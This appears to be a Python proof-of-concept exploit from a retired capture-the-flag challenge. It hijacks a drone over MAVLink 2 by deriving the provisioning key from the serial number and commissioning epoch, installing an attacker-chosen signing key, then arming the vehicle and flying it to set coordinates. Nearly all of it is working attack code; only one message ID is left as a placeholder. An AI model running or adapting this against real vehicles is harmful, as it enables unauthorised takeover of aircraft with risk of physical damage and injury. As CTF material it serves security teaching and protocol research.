#!/usr/bin/env python3
"""GridWatch — MAVLink 2 SETUP_SIGNING re-provisioning and DO_REPOSITION PoC.

Derives the provisioning key from the airframe serial, the commissioning
epoch and the per-connection nonce, installs an attacker session key via
SETUP_SIGNING, then runs the authorized flight sequence
(DO_SET_MODE GUIDED -> ARM -> DO_REPOSITION).

Usage: python3 grid_watch.py <host> <port>
       python3 grid_watch.py --fit <capture.tlog>   (RTC calibration only)

Note: the CTF instance is retired; this PoC documents the exploit path.
"""
import hashlib
import hmac
import re
import socket
import struct
import sys
import time

EPOCH = 1733965123            # custom commissioning epoch (2024-12-12 00:58:43 UTC)
TICKS_PER_SEC = 100001.7      # RTC runs +17.0 ppm fast (b = 9.99983 us/tick)
SERIAL = b"CX-FALCON-9951"
LINK_ID = 249
GCS_SYSID, GCS_COMPID = 255, 190
DRONE_SYSID, DRONE_COMPID = 1, 1

MSG_COMMAND_LONG, MSG_COMMAND_ACK, MSG_STATUSTEXT = 76, 77, 253
CRC_EXTRA = {0: 50, 33: 104, 76: 152, 77: 143, 253: 83}
SETUP_SIGNING_MSGID = None    # TODO: supply SETUP_SIGNING message id (not recorded in the writeup)
SETUP_SIGNING_CRC_EXTRA = 71


def rtc_ticks(now=None):
    now = time.time() if now is None else now
    return round((now - EPOCH) * TICKS_PER_SEC)


def hkdf_sha256(ikm, salt, info, length=32):
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    okm, t, i = b"", b"", 1
    while len(okm) < length:
        t = hmac.new(prk, t + info + bytes([i]), hashlib.sha256).digest()
        okm += t
        i += 1
    return okm[:length]


def prov_key(nonce_hex):
    salt = bytes.fromhex(nonce_hex)  # decoded 8 bytes, not the 16-char hex string
    return hkdf_sha256(SERIAL + struct.pack("<Q", EPOCH), salt, b"CX-PROV/v1", 32)


def crc_x25(data, crc=0xFFFF):
    for byte in data:
        tmp = byte ^ (crc & 0xFF)
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


def build_frame(msgid, payload, key, seq, crc_extra, ts_ticks=None):
    ts_ticks = rtc_ticks() if ts_ticks is None else ts_ticks
    header = struct.pack("<BBBBBBB", 0xFD, len(payload), 0x01, 0x00, seq,
                         GCS_SYSID, GCS_COMPID) + msgid.to_bytes(3, "little")
    body = header + payload
    crc = crc_x25(body + bytes([crc_extra]))
    core = body + struct.pack("<H", crc)
    ts6 = ts_ticks.to_bytes(6, "little")
    sig = hashlib.sha256(key + core + bytes([LINK_ID]) + ts6).digest()[:6]
    return core + bytes([LINK_ID]) + ts6 + sig


def read_frame(sock, buf):
    while True:
        start = buf.find(b"\xfd")
        if start == -1:
            buf.clear()
            return None, buf
        if len(buf) - start < 12:  # min: header(10) + crc(2)
            del buf[:start]
            return None, buf
        plen = buf[start + 1]
        signed = bool(buf[start + 2] & 0x01)
        total = 10 + plen + 2 + (13 if signed else 0)
        if len(buf) - start < total:
            del buf[:start]
            return None, buf
        frame = bytes(buf[start:start + total])
        del buf[:start + total]
        msgid = int.from_bytes(frame[7:10], "little")
        return (msgid, frame[10:10 + plen]), buf


def command_long(command, *params):
    p = list(params) + [0.0] * (7 - len(params))
    return struct.pack("<7fHBB", *p, command, DRONE_SYSID, DRONE_COMPID)


def transact(sock, buf, frame, expect=(MSG_COMMAND_ACK, MSG_STATUSTEXT), timeout=5.0):
    sock.sendall(frame)
    sock.settimeout(timeout)
    notes = []
    while True:
        try:
            res, buf = read_frame(sock, buf)
        except socket.timeout:
            return notes, buf
        if res is None:
            continue
        msgid, payload = res
        if msgid == MSG_STATUSTEXT:
            text = payload[1:].split(b"\x00", 1)[0].decode(errors="replace")
            print("STATUSTEXT:", text)
            notes.append(text)
        elif msgid == MSG_COMMAND_ACK:
            cmd, result = struct.unpack_from("<HB", payload, 0)
            print(f"COMMAND_ACK cmd={cmd} result={result}")
            notes.append(f"ack:{cmd}:{result}")
            if msgid in expect:
                return notes, buf
        elif msgid in expect:
            return notes, buf


def fit_rtc(tlog):
    """Least-squares fit t_unix = a + b*ticks from a captured tlog (informational)."""
    xs, ys = [], []
    with open(tlog, "rb") as fh:
        data = fh.read()
    off = 0
    while off + 8 < len(data):
        t_unix_us = struct.unpack_from(">Q", data, off)[0]
        if data[off + 8] != 0xFD:
            off += 1
            continue
        plen = data[off + 9]
        signed = bool(data[off + 10] & 0x01)
        total = 8 + 10 + plen + 2 + (13 if signed else 0)
        frame = data[off:off + total]
        if signed and len(frame) >= total:
            ts6 = frame[-13:-7]
            xs.append(int.from_bytes(ts6, "little"))
            ys.append(t_unix_us / 1e6)
        off += total
    n = len(xs)
    sx, sy = sum(xs), sum(ys)
    sxx = sum(x * x for x in xs)
    sxy = sum(x * y for x, y in zip(xs, ys))
    b = (n * sxy - sx * sy) / (n * sxx - sx * sx)
    a = (sy - b * sx) / n
    print(f"samples={n} b={b * 1e6:.8f} us/tick  ticks/s={1 / b:.1f}  epoch~{a:.0f}")


def main():
    if len(sys.argv) == 3 and sys.argv[1] == "--fit":
        fit_rtc(sys.argv[2])
        return
    if len(sys.argv) != 3:
        sys.exit("Usage: python3 grid_watch.py <host> <port> | --fit <capture.tlog>")
    if SETUP_SIGNING_MSGID is None:
        sys.exit("TODO: supply SETUP_SIGNING message id (not recorded in the writeup) before running against a target.")
    host, port = sys.argv[1], int(sys.argv[2])

    sock = socket.create_connection((host, port), timeout=10)
    buf = bytearray()
    sock.settimeout(10)
    greeting = b""
    while b"PROV NONCE" not in greeting:  # drone emits heartbeat, status line, then the nonce
        chunk = sock.recv(4096)
        if not chunk:
            sys.exit("Connection closed before PROV NONCE.")
        greeting += chunk
        buf += chunk
    m = re.search(rb"PROV NONCE ([0-9a-fA-F]{16})", greeting)
    nonce_hex = m.group(1).decode()
    print("nonce:", nonce_hex)
    key = prov_key(nonce_hex)

    seq = 0
    ts = rtc_ticks()
    session_key = hashlib.sha256(b"gridwatch-poc-session-key").digest()  # attacker-chosen session key
    # Wire order: initial_timestamp, target_system, target_component, secret_key (key at offset 10).
    setup_payload = struct.pack("<Q", ts) + b"\x01\x01" + session_key
    frame = build_frame(SETUP_SIGNING_MSGID, setup_payload, key, seq, SETUP_SIGNING_CRC_EXTRA, ts)
    seq += 1
    _, buf = transact(sock, buf, frame)  # expect "signing re-provisioned: new key active"

    for command, params in ((176, (1, 4)),          # DO_SET_MODE, CUSTOM_MODE_ENABLED + GUIDED
                            (400, (1,)),            # COMPONENT_ARM_DISARM, arm
                            (192, (0, 0, 0, 0, 45.65, 24.15, 100))):  # DO_REPOSITION
        frame = build_frame(MSG_COMMAND_LONG, command_long(command, *params),
                            session_key, seq, CRC_EXTRA[MSG_COMMAND_LONG])
        seq += 1
        transact(sock, buf, frame)

    sock.close()


if __name__ == "__main__":
    main()
